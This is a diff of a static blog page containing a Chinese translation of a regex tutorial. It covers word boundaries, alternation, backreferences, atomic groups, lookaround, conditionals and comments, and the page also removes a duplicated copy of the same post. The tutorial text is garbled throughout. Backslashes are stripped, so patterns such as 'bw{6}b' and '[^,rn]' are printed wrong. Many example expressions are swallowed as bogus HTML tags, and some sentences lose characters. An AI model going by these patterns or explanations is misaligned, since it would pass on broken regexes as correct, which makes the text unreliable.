+<p>我们容易想到这样的正则表达式&lt;&lt;^(.*?,){11}P&gt;&gt;。这个正则表达式在正常情况下工作的很好。但是在极端情况下，如果第12个字段不是由P开头，则会发生灾难性的回溯。如要搜索的字串为“1,2,3,4,5,6,7,8,9,10,11,12,13”。首先，正则表达式一直成功匹配直到第12个字符。这时，前面的正则表达式消耗的字串为“1,2,3,4,5,6,7,8,9,10,11,”，到了下一个字符，&lt;</p><p>&gt;并不匹配“12”。所以引擎进行回溯，这时正则表达式消耗的字串为“1,2,3,4,5,6,7,8,9,10,11”。继续下一次匹配过程，下一个正则符号为点号&lt;&lt;.&gt;&gt;，可以匹配下一个逗号“,”。然而&lt;&lt;，&gt;&gt;并不匹配字符“12”中的“1”。匹配失败，继续回溯。大家可以想象，这样的回溯组合是个非常大的数量。因此可能会造成引擎崩溃。</p>
+<p>用于阻止这样巨大的回溯有几种方案：</p>
+<p>一种简单的方案是尽可能的使匹配精确。用取反字符集代替点号。例如我们用如下正则表达式&lt;&lt;^([^,rn]*,){11}P&gt;&gt;，这样可以使失败回溯的次数下降到11次。</p>
+<p>另一种方案是使用原子组。</p>
+<p>原子组的目的是使正则引擎失败的更快一点。因此可以有效的阻止海量回溯。原子组的语法是&lt;&lt;(?&gt;正则表达式)&gt;&gt;。位于(?&gt;)之间的所有正则表达式都会被认为是一个单一的正则符号。一旦匹配失败，引擎将会回溯到原子组前面的正则表达式部分。前面的例子用原子组可以表达成&lt;&lt;^(?&gt;(.*?,){11})P&gt;&gt;。一旦第十二个字段匹配失败，引擎回溯到原子组前面的&lt;&lt;^&gt;&gt;。</p>
+<p>14.  向前查看与向后查看</p>
+<p>Perl 5 引入了两个强大的正则语法：“向前查看”和“向后查看”。他们也被称作“零长度断言”。他们和锚定一样都是零长度的（所谓零长度即指该正则表达式不消耗被匹配的字符串）。不同之处在于“前后查看”会实际匹配字符，只是他们会抛弃匹配只返回匹配结果：匹配或不匹配。这就是为什么他们被称作“断言”。他们并不实际消耗字符串中的字符，而只是断言一个匹配是否可能。</p>
+<p>几乎本文讨论的所有正则表达式的实现都支持“向前向后查看”。唯一的一个例外是Javascript只支持向前查看。</p>
+<p>·        肯定和否定式的向前查看</p>
+<p>如我们前面提过的一个例子：要查找一个q，后面没有紧跟一个u。也就是说，要么q后面没有字符，要么后面的字符不是u。采用否定式向前查看后的一个解决方案为&lt;<q(?!u)>&gt;。否定式向前查看的语法是&lt;&lt;(?!查看的内容)&gt;&gt;。</q(?!u)></p>
+<p>肯定式向前查看和否定式向前查看很类似：&lt;&lt;(?=查看的内容)&gt;&gt;。</p>
+<p>如果在“查看的内容”部分有组，也会产生一个向后引用。但是向前查看本身并不会产生向后引用，也不会被计入向后引用的编号中。这是因为向前查看本身是会被抛弃掉的，只保留匹配与否的判断结果。如果你想保留匹配的结果作为向后引用，你可以用&lt;&lt;(?=(regex))&gt;&gt;来产生一个向后引用。</p>
+<p>·        肯定和否定式的先后查看</p>
+<p>向后查看和向前查看有相同的效果，只是方向相反</p>
+<p>否定式向后查看的语法是：&lt;&lt;(?&lt;!查看内容)&gt;&gt;</p>
+<p>肯定式向后查看的语法是：&lt;&lt;(?&lt;=查看内容)&gt;&gt;</p>
+<p>我们可以看到，和向前查看相比，多了一个表示方向的左尖括号。</p>
+<p>例：&lt;&lt;(?&lt;!a)b&gt;&gt;将会匹配一个没有“a”作前导字符的“b”。</p>
+<p>值得注意的是：向前查看从当前字符串位置开始对“查看”正则表达式进行匹配；向后查看则从当前字符串位置开始先后回溯一个字符，然后再开始对“查看”正则表达式进行匹配。</p>
+<p>·        深入正则表达式引擎内部</p>
+<p>让我们看一个简单例子。</p>
+<p>把正则表达式&lt;<q(?!u)>&gt;应用到字符串“Iraq”。正则表达式的第一个符号是&lt;<q>&gt;。正如我们知道的，引擎在匹配&lt;<q>&gt;以前会扫过整个字符串。当第四个字符“q”被匹配后，“q”后面是空字符(void)。而下一个正则符号是向前查看。引擎注意到已经进入了一个向前查看正则表达式部分。下一个正则符号是&lt;<u>&gt;，和空字符不匹配，从而导致向前查看里的正则表达式匹配失败。因为是一个否定式的向前查看，意味着整个向前查看结果是成功的。于是匹配结果“q”被返回了。</u></q></q></q(?!u)></p>
+<p>我们在把相同的正则表达式应用到“quit”。&lt;<q>&gt;匹配了“q”。下一个正则符号是向前查看部分的&lt;<u>&gt;，它匹配了字符串中的第二个字符“i”。引擎继续走到下个字符“i”。然而引擎这时注意到向前查看部分已经处理完了，并且向前查看已经成功。于是引擎抛弃被匹配的字符串部分，这将导致引擎回退到字符“u”。</u></q></p>
+<p>因为向前查看是否定式的，意味着查看部分的成功匹配导致了整个向前查看的失败，因此引擎不得不进行回溯。最后因为再没有其他的“q”和&lt;<q>&gt;匹配，所以整个匹配失败了。</q></p>
+<p>为了确保你能清楚地理解向前查看的实现，让我们把&lt;<q(?=u)i>&gt;应用到“quit”。&lt;<q>&gt;首先匹配“q”。然后向前查看成功匹配“u”，匹配的部分被抛弃，只返回可以匹配的判断结果。引擎从字符“i”回退到“u”。由于向前查看成功了，引擎继续处理下一个正则符号&lt;<i>&gt;。结果发现&lt;<i>&gt;和“u”不匹配。因此匹配失败了。由于后面没有其他的“q”，整个正则表达式的匹配失败了。</i></i></q></q(?=u)i></p>
+<p>·        更进一步理解正则表达式引擎内部机制</p>
+<p>让我们把&lt;&lt;(?&lt;=a)b&gt;&gt;应用到“thingamabob”。引擎开始处理向后查看部分的正则符号和字符串中的第一个字符。在这个例子中，向后查看告诉正则表达式引擎回退一个字符，然后查看是否有一个“a”被匹配。因为在“t”前面没有字符，所以引擎不能回退。因此向后查看失败了。引擎继续走到下一个字符“h”。再一次，引擎暂时回退一个字符并检查是否有个“a”被匹配。结果发现了一个“t”。向后查看又失败了。</p>
+<p>向后查看继续失败，直到正则表达式到达了字符串中的“m”，于是肯定式的向后查看被匹配了。因为它是零长度的，字符串的当前位置仍然是“m”。下一个正则符号是&lt;<b>&gt;，和“m”匹配失败。下一个字符是字符串中的第二个“a”。引擎向后暂时回退一个字符，并且发现&lt;<a>&gt;不匹配“m”。</a></b></p>
+<p>在下一个字符是字符串中的第一个“b”。引擎暂时性的向后退一个字符发现向后查看被满足了，同时&lt;<b>&gt;匹配了“b”。因此整个正则表达式被匹配了。作为结果，正则表达式返回字符串中的第一个“b”。</b></p>
+<p>·        向前向后查看的应用</p>
+<p>我们来看这样一个例子：查找一个具有6位字符的，含有“cat”的单词。</p>
+<p>首先，我们可以不用向前向后查看来解决问题，例如：</p>
+<p>&lt;&lt; catw{3}|wcatw{2}|w{2}catw|w{3}cat&gt;&gt;</p>
+<p>足够简单吧！但是当需求变成查找一个具有6-12位字符，含有“cat”，“dog”或“mouse”的单词时，这种方法就变得有些笨拙了。</p>
+<p>我们来看看使用向前查看的方案。在这个例子中，我们有两个基本需求要满足：一是我们需要一个6位的字符，二是单词含有“cat”。</p>
+<p>满足第一个需求的正则表达式为&lt;<bw{6}b>&gt;。满足第二个需求的正则表达式为&lt;<bw*catw*b>&gt;。</bw*catw*b></bw{6}b></p>
+<p>把两者结合起来，我们可以得到如下的正则表达式：</p>
+<pre><code>&lt;&lt;(?=bw{6}b)bw*catw*b&gt;&gt;
+</code></pre><p>具体的匹配过程留给读者。但是要注意的一点是，向前查看是不消耗字符的，因此当判断单词满足具有6个字符的条件后，引擎会从开始判断前的位置继续对后面的正则表达式进行匹配。</p>
+<p>最后作些优化，可以得到下面的正则表达式：</p>
+<p>&lt;<b(?=w{6}b)w{0,3}catw*>&gt;</b(?=w{6}b)w{0,3}catw*></p>
+<p>15.  正则表达式中的条件测试</p>
+<p>条件测试的语法为&lt;&lt;(?ifthen|else)&gt;&gt;。“if”部分可以是向前向后查看表达式。如果用向前查看，则语法变为：&lt;&lt;(?(?=regex)then|else)&gt;&gt;，其中else部分是可选的。</p>
+<p>如果if部分为true，则正则引擎会试图匹配then部分，否则引擎会试图匹配else部分。</p>
+<p>需要记住的是，向前先后查看并不实际消耗任何字符，因此后面的then与else部分的匹配时从if测试前的部分开始进行尝试。</p>
+<p>16.  为正则表达式添加注释</p>
+<p>在正则表达式中添加注释的语法是：&lt;&lt;(?#comment)&gt;&gt;</p>
+<p>例：为用于匹配有效日期的正则表达式添加注释：</p>
+<p> (?#year)(19|20)dd<a href="?#month">- /.</a>(0[1-9]|1[012])<a href="?#day">- /.</a>(0[1-9]|[12][0-9]|3[01])`</p>
+
+          
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2008/03/23/e5-b7-a9-e5-9b-baapache-e9-85-8d-e7-bd-ae-e7-9a-84-e5-ae-89-e5-85-a8-e6-96-b9-e6-b3-9520-e5-88-99/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1532,249 +1615,6 @@
   
 
   <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2008/03/23/e6-b7-b1-e5-85-a5-e6-b5-85-e5-87-ba-e4-b9-8b-e6-ad-a3-e5-88-99-e8-a1-a8-e8-be-be-e5-bc-8f-ef-bc-88-e4-ba-8c-ef-bc-89/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="九王爷">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="九王爷">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-            
-            
-              
-                
-                <a class="post-title-link" href="/2008/03/23/e6-b7-b1-e5-85-a5-e6-b5-85-e5-87-ba-e4-b9-8b-e6-ad-a3-e5-88-99-e8-a1-a8-e8-be-be-e5-bc-8f-ef-bc-88-e4-ba-8c-ef-bc-89/" itemprop="url">
-                  深入浅出之正则表达式（二）
-                </a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2008-03-23T22:52:56+08:00">
-                2008-03-23
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Other/" itemprop="url" rel="index">
-                    <span itemprop="name">Other</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <p>`前言：<br>       本文是前一片文章《深入浅出之正则表达式（一）》的续篇，在本文中讲述了正则表达式中的组与向后引用，先前向后查看，条件测试，单词边界，选择符等表达式及例子，并分析了正则引擎在执行匹配时的内部机理。<br>       本文是Jan Goyvaerts为RegexBuddy写的教程的译文，版权归原作者所有，欢迎转载。但是为了尊重原作者和译者的劳动，请注明出处！谢谢！</p>
-<p>9.      单词边界</p>
-<p>元字符&lt;**&gt;也是一种对位置进行匹配的“锚”。这种匹配是0长度匹配。</p>
-<p>有4种位置被认为是“单词边界”：</p>
-<p>1)        在字符串的第一个字符前的位置(如果字符串的第一个字符是一个“单词字符”)</p>
-<p>2)        在字符串的最后一个字符后的位置(如果字符串的最后一个字符是一个“单词字符”)</p>
-<p>3)        在一个“单词字符”和“非单词字符”之间，其中“非单词字符”紧跟在“单词字符”之后</p>
-<p>4)        在一个“非单词字符”和“单词字符”之间，其中“单词字符”紧跟在“非单词字符”后面</p>
-<p> “单词字符”是可以用“w”匹配的字符，“非单词字符”是可以用“W”匹配的字符。在大多数的正则表达式实现中，“单词字符”通常包括&lt;&lt;[a-zA-Z0-9_]&gt;&gt;。</p>
-<p>例如：&lt;<b4b>&gt;能够匹配单个的4而不是一个更大数的一部分。这个正则表达式不会匹配“44”中的4。</b4b></p>
-<p>换种说法，几乎可以说&lt;<b>&gt;匹配一个“字母数字序列”的开始和结束的位置。</b></p>
-<p>“单词边界”的取反集为&lt;<b>&gt;，他要匹配的位置是两个“单词字符”之间或者两个“非单词字符”之间的位置。</b></p>
-<p>·        深入正则表达式引擎内部</p>
-<p>让我们看看把正则表达式&lt;<bisb>&gt;应用到字符串“This island is beautiful”。引擎先处理符号&lt;<b>&gt;。因为b是0长度 ，所以第一个字符T前面的位置会被考察。因为T是一个“单词字符”，而它前面的字符是一个空字符(void)，所以b匹配了单词边界。接着<_>和第一个字符“T”匹配失败。匹配过程继续进行，直到第五个空格符，和第四个字符“s”之间又匹配了&lt;<b>&gt;。然而空格符和&lt;<i>&gt;不匹配。继续向后，到了第六个字符“i”，和第五个空格字符之间匹配了&lt;<b>&gt;，然后&lt;<is>&gt;和第六、第七个字符都匹配了。然而第八个字符和第二个“单词边界”不匹配，所以匹配又失败了。到了第13个字符i，因为和前面一个空格符形成“单词边界”，同时&lt;<is>&gt;和“is”匹配。引擎接着尝试匹配第二个&lt;<b>&gt;。因为第15个空格符和“s”形成单词边界，所以匹配成功。引擎“急着”返回成功匹配的结果。</b></is></is></b></i></b></_></b></bisb></p>
-<p>10.  选择符</p>
-<p>正则表达式中“|”表示选择。你可以用选择符匹配多个可能的正则表达式中的一个。</p>
-<p>如果你想搜索文字“cat”或“dog”，你可以用&lt;<cat|dog>&gt;。如果你想有更多的选择，你只要扩展列表&lt;<cat|dog|mouse|fish>&gt;。</cat|dog|mouse|fish></cat|dog></p>
-<p>选择符在正则表达式中具有最低的优先级，也就是说，它告诉引擎要么匹配选择符左边的所有表达式，要么匹配右边的所有表达式。你也可以用圆括号来限制选择符的作用范围。如&lt;<b(cat|dog)b>&gt;，这样告诉正则引擎把(cat|dog)当成一个正则表达式单位来处理。</b(cat|dog)b></p>
-<p>·        注意正则引擎的“急于表功”性</p>
-<p>正则引擎是急切的，当它找到一个有效的匹配时，它会停止搜索。因此在一定条件下，选择符两边的表达式的顺序对结果会有影响。假设你想用正则表达式搜索一个编程语言的函数列表：Get，GetValue，Set或SetValue。一个明显的解决方案是&lt;<get|getvalue|set|setvalue>&gt;。让我们看看当搜索SetValue时的结果。</get|getvalue|set|setvalue></p>
-<p>因为&lt;<get>&gt;和&lt;<getvalue>&gt;都失败了，而&lt;<set>&gt;匹配成功。因为正则导向的引擎都是“急切”的，所以它会返回第一个成功的匹配，就是“Set”，而不去继续搜索是否有其他更好的匹配。</set></getvalue></get></p>
-<p>和我们期望的相反，正则表达式并没有匹配整个字符串。有几种可能的解决办法。一是考虑到正则引擎的“急切”性，改变选项的顺序，例如我们使用&lt;<getvalue|get|setvalue|set>&gt;，这样我们就可以优先搜索最长的匹配。我们也可以把四个选项结合起来成两个选项：&lt;<get(value)?|set(value)?>&gt;。因为问号重复符是贪婪的，所以SetValue总会在Set之前被匹配。</get(value)?|set(value)?></getvalue|get|setvalue|set></p>
-<p>一个更好的方案是使用单词边界：&lt;<b(get|getvalue|set|setvalue)b>&gt;或&lt;<b(get(value)?|set(value)?b>&gt;。更进一步，既然所有的选择都有相同的结尾，我们可以把正则表达式优化为&lt;<b(get|set)(value)?b>&gt;。</b(get|set)(value)?b></b(get(value)?|set(value)?b></b(get|getvalue|set|setvalue)b></p>
-<p>11.  组与向后引用</p>
-<p>把正则表达式的一部分放在圆括号内，你可以将它们形成组。然后你可以对整个组使用一些正则操作，例如重复操作符。</p>
-<p>要注意的是，只有圆括号“()”才能用于形成组。“[]”用于定义字符集。“{}”用于定义重复操作。</p>
-<p>当用“()”定义了一个正则表达式组后，正则引擎则会把被匹配的组按照顺序编号，存入缓存。当对被匹配的组进行向后引用的时候，可以用“数字”的方式进行引用。&lt;<1>&gt;引用第一个匹配的后向引用组，&lt;<2>&gt;引用第二个组，以此类推，&lt;<n>&gt;引用第n个组。而&lt;&lt; &gt;&gt;则引用整个被匹配的正则表达式本身。我们看一个例子。</n></2></1></p>
-<p>假设你想匹配一个HTML标签的开始标签和结束标签，以及标签中间的文本。比如<b>This is a test<strong>，我们要匹配</strong>和<em>*以及中间的文字。我们可以用如下正则表达式：“&lt;([A-Z][A-Z0-9]</em>)[^&gt;]<em>&gt;.</em>?”</b></p>
-<p>首先，“&lt;”将会匹配“<strong>”的第一个字符“&lt;”。然后[A-Z]匹配B，[A-Z0-9]<em>将会匹配0到多次字母数字，后面紧接着0到多个非“&gt;”的字符。最后正则表达式的“&gt;”将会匹配“<b>”的“&gt;”。接下来正则引擎将对结束标签之前的字符进行惰性匹配，直到遇到一个“&lt;/”符号。然后正则表达式中的“1”表示对前面匹配的组“([A-Z][A-Z0-9]</b></em>)”进行引用，在本例中，被引用的是标签名“B”。所以需要被匹配的结尾标签为“</strong>”</p>
-<p>你可以对相同的后向引用组进行多次引用，&lt;&lt;([a-c])x1x1&gt;&gt;将匹配“axaxa”、“bxbxb”以及“cxcxc”。如果用数字形式引用的组没有有效的匹配，则引用到的内容简单的为空。</p>
-<p>一个后向引用不能用于它自身。&lt;&lt;([abc]1)&gt;&gt;是错误的。因此你不能将&lt;&lt; &gt;&gt;用于一个正则表达式匹配本身，它只能用于替换操作中。</p>
-<p>后向引用不能用于字符集内部。&lt;&lt;(a)[1b]&gt;&gt;中的&lt;<1>&gt;并不表示后向引用。在字符集内部，&lt;<1>&gt;可以被解释为八进制形式的转码。</1></1></p>
-<p>向后引用会降低引擎的速度，因为它需要存储匹配的组。如果你不需要向后引用，你可以告诉引擎对某个组不存储。例如：&lt;<get(?:value)>&gt;。其中“(”后面紧跟的“?:”会告诉引擎对于组(Value)，不存储匹配的值以供后向引用。</get(?:value)></p>
-<p>·        重复操作与后向引用</p>
-<p>当对组使用重复操作符时，缓存里后向引用内容会被不断刷新，只保留最后匹配的内容。例如：&lt;&lt;([abc]+)=1&gt;&gt;将匹配“cab=cab”，但是&lt;&lt;([abc])+=1&gt;&gt;却不会。因为([abc])第一次匹配“c”时，“1”代表“c”；然后([abc])会继续匹配“a”和“b”。最后“1”代表“b”，所以它会匹配“cab=b”。</p>
-<p>应用：检查重复单词–当编辑文字时，很容易就会输入重复单词，例如“the the”。使用&lt;<b(w+)s+1b>&gt;可以检测到这些重复单词。要删除第二个单词，只要简单的利用替换功能替换掉“1”就可以了。</b(w+)s+1b></p>
-<p>·        组的命名和引用</p>
-<p>在PHP，Python中，可以用&lt;&lt;(?P<name>group)&gt;&gt;来对组进行命名。在本例中，词法?P<name>就是对组(group)进行了命名。其中name是你对组的起的名字。你可以用(?P=name)进行引用。</name></name></p>
-<p>.NET的命名组</p>
-<p>.NET framework也支持命名组。不幸的是，微软的程序员们决定发明他们自己的语法，而不是沿用Perl、Python的规则。目前为止，还没有任何其他的正则表达式实现支持微软发明的语法。</p>
-<p>下面是.NET中的例子：</p>
-<p>(?<first>group)(?’second’group)</first></p>
-<p>正如你所看到的，.NET提供两种词法来创建命名组：一是用尖括号“&lt;&gt;”，或者用单引号“’’”。尖括号在字符串中使用更方便，单引号在ASP代码中更有用，因为ASP代码中“&lt;&gt;”被用作HTML标签。</p>
-<p>要引用一个命名组，使用k<name>或k’name’.</name></p>
-<p>当进行搜索替换时，你可以用“${name}”来引用一个命名组。</p>
-<p>12.  正则表达式的匹配模式</p>
-<p>本教程所讨论的正则表达式引擎都支持三种匹配模式：</p>
-<p><_>使正则表达式对大小写不敏感，</_></p>
-<p>&lt;&gt;开启“单行模式”，即点号“.”匹配新行符</p>
-<p>&lt;&gt;开启“多行模式”，即“^”和“$”匹配新行符的前面和后面的位置。</p>
-<p>·        在正则表达式内部打开或关闭模式</p>
-<p>如果你在正则表达式内部插入修饰符(?ism)，则该修饰符只对其右边的正则表达式起作用。(?-i)是关闭大小写不敏感。你可以很快的进行测试。&lt;&lt;(?i)te(?-i)st&gt;&gt;应该匹配TEst，但是不能匹配teST或TEST.</p>
-<p>13.  原子组与防止回溯</p>
-<p>在一些特殊情况下，因为回溯会使得引擎的效率极其低下。</p>
-<p>让我们看一个例子：要匹配这样的字串，字串中的每个字段间用逗号做分隔符，第12个字段由P开头。</p>
-<p>我们容易想到这样的正则表达式&lt;&lt;^(.*?,){11}P&gt;&gt;。这个正则表达式在正常情况下工作的很好。但是在极端情况下，如果第12个字段不是由P开头，则会发生灾难性的回溯。如要搜索的字串为“1,2,3,4,5,6,7,8,9,10,11,12,13”。首先，正则表达式一直成功匹配直到第12个字符。这时，前面的正则表达式消耗的字串为“1,2,3,4,5,6,7,8,9,10,11,”，到了下一个字符，&lt;</p><p>&gt;并不匹配“12”。所以引擎进行回溯，这时正则表达式消耗的字串为“1,2,3,4,5,6,7,8,9,10,11”。继续下一次匹配过程，下一个正则符号为点号&lt;&lt;.&gt;&gt;，可以匹配下一个逗号“,”。然而&lt;&lt;，&gt;&gt;并不匹配字符“12”中的“1”。匹配失败，继续回溯。大家可以想象，这样的回溯组合是个非常大的数量。因此可能会造成引擎崩溃。</p>
-<p>用于阻止这样巨大的回溯有几种方案：</p>
-<p>一种简单的方案是尽可能的使匹配精确。用取反字符集代替点号。例如我们用如下正则表达式&lt;&lt;^([^,rn]*,){11}P&gt;&gt;，这样可以使失败回溯的次数下降到11次。</p>
-<p>另一种方案是使用原子组。</p>
-<p>原子组的目的是使正则引擎失败的更快一点。因此可以有效的阻止海量回溯。原子组的语法是&lt;&lt;(?&gt;正则表达式)&gt;&gt;。位于(?&gt;)之间的所有正则表达式都会被认为是一个单一的正则符号。一旦匹配失败，引擎将会回溯到原子组前面的正则表达式部分。前面的例子用原子组可以表达成&lt;&lt;^(?&gt;(.*?,){11})P&gt;&gt;。一旦第十二个字段匹配失败，引擎回溯到原子组前面的&lt;&lt;^&gt;&gt;。</p>
-<p>14.  向前查看与向后查看</p>
-<p>Perl 5 引入了两个强大的正则语法：“向前查看”和“向后查看”。他们也被称作“零长度断言”。他们和锚定一样都是零长度的（所谓零长度即指该正则表达式不消耗被匹配的字符串）。不同之处在于“前后查看”会实际匹配字符，只是他们会抛弃匹配只返回匹配结果：匹配或不匹配。这就是为什么他们被称作“断言”。他们并不实际消耗字符串中的字符，而只是断言一个匹配是否可能。</p>
-<p>几乎本文讨论的所有正则表达式的实现都支持“向前向后查看”。唯一的一个例外是Javascript只支持向前查看。</p>
-<p>·        肯定和否定式的向前查看</p>
-<p>如我们前面提过的一个例子：要查找一个q，后面没有紧跟一个u。也就是说，要么q后面没有字符，要么后面的字符不是u。采用否定式向前查看后的一个解决方案为&lt;<q(?!u)>&gt;。否定式向前查看的语法是&lt;&lt;(?!查看的内容)&gt;&gt;。</q(?!u)></p>
-<p>肯定式向前查看和否定式向前查看很类似：&lt;&lt;(?=查看的内容)&gt;&gt;。</p>
-<p>如果在“查看的内容”部分有组，也会产生一个向后引用。但是向前查看本身并不会产生向后引用，也不会被计入向后引用的编号中。这是因为向前查看本身是会被抛弃掉的，只保留匹配与否的判断结果。如果你想保留匹配的结果作为向后引用，你可以用&lt;&lt;(?=(regex))&gt;&gt;来产生一个向后引用。</p>
-<p>·        肯定和否定式的先后查看</p>
-<p>向后查看和向前查看有相同的效果，只是方向相反</p>
-<p>否定式向后查看的语法是：&lt;&lt;(?&lt;!查看内容)&gt;&gt;</p>
-<p>肯定式向后查看的语法是：&lt;&lt;(?&lt;=查看内容)&gt;&gt;</p>
-<p>我们可以看到，和向前查看相比，多了一个表示方向的左尖括号。</p>
-<p>例：&lt;&lt;(?&lt;!a)b&gt;&gt;将会匹配一个没有“a”作前导字符的“b”。</p>
-<p>值得注意的是：向前查看从当前字符串位置开始对“查看”正则表达式进行匹配；向后查看则从当前字符串位置开始先后回溯一个字符，然后再开始对“查看”正则表达式进行匹配。</p>
-<p>·        深入正则表达式引擎内部</p>
-<p>让我们看一个简单例子。</p>
-<p>把正则表达式&lt;<q(?!u)>&gt;应用到字符串“Iraq”。正则表达式的第一个符号是&lt;<q>&gt;。正如我们知道的，引擎在匹配&lt;<q>&gt;以前会扫过整个字符串。当第四个字符“q”被匹配后，“q”后面是空字符(void)。而下一个正则符号是向前查看。引擎注意到已经进入了一个向前查看正则表达式部分。下一个正则符号是&lt;<u>&gt;，和空字符不匹配，从而导致向前查看里的正则表达式匹配失败。因为是一个否定式的向前查看，意味着整个向前查看结果是成功的。于是匹配结果“q”被返回了。</u></q></q></q(?!u)></p>
-<p>我们在把相同的正则表达式应用到“quit”。&lt;<q>&gt;匹配了“q”。下一个正则符号是向前查看部分的&lt;<u>&gt;，它匹配了字符串中的第二个字符“i”。引擎继续走到下个字符“i”。然而引擎这时注意到向前查看部分已经处理完了，并且向前查看已经成功。于是引擎抛弃被匹配的字符串部分，这将导致引擎回退到字符“u”。</u></q></p>
-<p>因为向前查看是否定式的，意味着查看部分的成功匹配导致了整个向前查看的失败，因此引擎不得不进行回溯。最后因为再没有其他的“q”和&lt;<q>&gt;匹配，所以整个匹配失败了。</q></p>
-<p>为了确保你能清楚地理解向前查看的实现，让我们把&lt;<q(?=u)i>&gt;应用到“quit”。&lt;<q>&gt;首先匹配“q”。然后向前查看成功匹配“u”，匹配的部分被抛弃，只返回可以匹配的判断结果。引擎从字符“i”回退到“u”。由于向前查看成功了，引擎继续处理下一个正则符号&lt;<i>&gt;。结果发现&lt;<i>&gt;和“u”不匹配。因此匹配失败了。由于后面没有其他的“q”，整个正则表达式的匹配失败了。</i></i></q></q(?=u)i></p>
-<p>·        更进一步理解正则表达式引擎内部机制</p>
-<p>让我们把&lt;&lt;(?&lt;=a)b&gt;&gt;应用到“thingamabob”。引擎开始处理向后查看部分的正则符号和字符串中的第一个字符。在这个例子中，向后查看告诉正则表达式引擎回退一个字符，然后查看是否有一个“a”被匹配。因为在“t”前面没有字符，所以引擎不能回退。因此向后查看失败了。引擎继续走到下一个字符“h”。再一次，引擎暂时回退一个字符并检查是否有个“a”被匹配。结果发现了一个“t”。向后查看又失败了。</p>
-<p>向后查看继续失败，直到正则表达式到达了字符串中的“m”，于是肯定式的向后查看被匹配了。因为它是零长度的，字符串的当前位置仍然是“m”。下一个正则符号是&lt;<b>&gt;，和“m”匹配失败。下一个字符是字符串中的第二个“a”。引擎向后暂时回退一个字符，并且发现&lt;<a>&gt;不匹配“m”。</a></b></p>
-<p>在下一个字符是字符串中的第一个“b”。引擎暂时性的向后退一个字符发现向后查看被满足了，同时&lt;<b>&gt;匹配了“b”。因此整个正则表达式被匹配了。作为结果，正则表达式返回字符串中的第一个“b”。</b></p>
-<p>·        向前向后查看的应用</p>
-<p>我们来看这样一个例子：查找一个具有6位字符的，含有“cat”的单词。</p>
-<p>首先，我们可以不用向前向后查看来解决问题，例如：</p>
-<p>&lt;&lt; catw{3}|wcatw{2}|w{2}catw|w{3}cat&gt;&gt;</p>
-<p>足够简单吧！但是当需求变成查找一个具有6-12位字符，含有“cat”，“dog”或“mouse”的单词时，这种方法就变得有些笨拙了。</p>
-<p>我们来看看使用向前查看的方案。在这个例子中，我们有两个基本需求要满足：一是我们需要一个6位的字符，二是单词含有“cat”。</p>
-<p>满足第一个需求的正则表达式为&lt;<bw{6}b>&gt;。满足第二个需求的正则表达式为&lt;<bw*catw*b>&gt;。</bw*catw*b></bw{6}b></p>
-<p>把两者结合起来，我们可以得到如下的正则表达式：</p>
-<pre><code>&lt;&lt;(?=bw{6}b)bw*catw*b&gt;&gt;
-</code></pre><p>具体的匹配过程留给读者。但是要注意的一点是，向前查看是不消耗字符的，因此当判断单词满足具有6个字符的条件后，引擎会从开始判断前的位置继续对后面的正则表达式进行匹配。</p>
-<p>最后作些优化，可以得到下面的正则表达式：</p>
-<p>&lt;<b(?=w{6}b)w{0,3}catw*>&gt;</b(?=w{6}b)w{0,3}catw*></p>
-<p>15.  正则表达式中的条件测试</p>
-<p>条件测试的语法为&lt;&lt;(?ifthen|else)&gt;&gt;。“if”部分可以是向前向后查看表达式。如果用向前查看，则语法变为：&lt;&lt;(?(?=regex)then|else)&gt;&gt;，其中else部分是可选的。</p>
-<p>如果if部分为true，则正则引擎会试图匹配then部分，否则引擎会试图匹配else部分。</p>
-<p>需要记住的是，向前先后查看并不实际消耗任何字符，因此后面的then与else部分的匹配时从if测试前的部分开始进行尝试。</p>
-<p>16.  为正则表达式添加注释</p>
-<p>在正则表达式中添加注释的语法是：&lt;&lt;(?#comment)&gt;&gt;</p>
-<p>例：为用于匹配有效日期的正则表达式添加注释：</p>
-<p> (?#year)(19|20)dd<a href="?#month">- /.</a>(0[1-9]|1[012])<a href="?#day">- /.</a>(0[1-9]|[12][0-9]|3[01])`</p>
-
-          
-        
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2008/03/22/e2-80-9c-e8-87-aa-e5-8a-a8-e8-bd-ac-e5-90-91-e2-80-9d-e6-8a-80-e6-9c-af/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
